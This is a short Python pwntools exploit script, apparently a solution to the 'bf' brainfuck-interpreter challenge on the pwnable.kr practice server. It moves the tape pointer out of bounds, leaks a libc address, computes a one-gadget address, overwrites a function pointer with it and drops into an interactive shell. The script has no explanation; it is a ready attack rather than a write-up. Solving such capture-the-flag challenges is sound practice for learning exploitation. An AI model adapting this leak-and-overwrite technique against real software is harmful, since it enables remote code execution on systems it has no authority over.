#usr/bin/python

from pwn import *

r = remote('pwnable.kr',9001)
#r = process('./bf')
print util.proc.pidof(r)

payload = ''

payload += '<'*0x88 + '.' + '>' + '.' + '>' + '.' + '>' + '.'
payload += '>'*0x15 + ',' + '>' + ',' + '>' + ',' + '>' + ','
payload += '>' + ','
payload += '.'

pause()
r.sendline(payload)
junk = r.recvuntil('[ ]\n')
leak = u32(r.recvn(4))
log.info('leak address is:%s' % hex(leak))
libc_base = leak - 0x5f020
log.info('libc base is:%s' % hex(libc_base))
one_gadget = libc_base + 0x5ef45
log.info('one gadget address is:%s' % hex(one_gadget))
one_gadget = p32(one_gadget)
first_byte = int(one_gadget[1:2].encode('hex'),16)
second_byte = int(one_gadget[2:3].encode('hex'),16)

r.send(p8(0x45))
r.send(p8(first_byte))
r.send(p8(second_byte))
r.send(p8(0xf7))

r.send(p8(0x0))

r.interactive()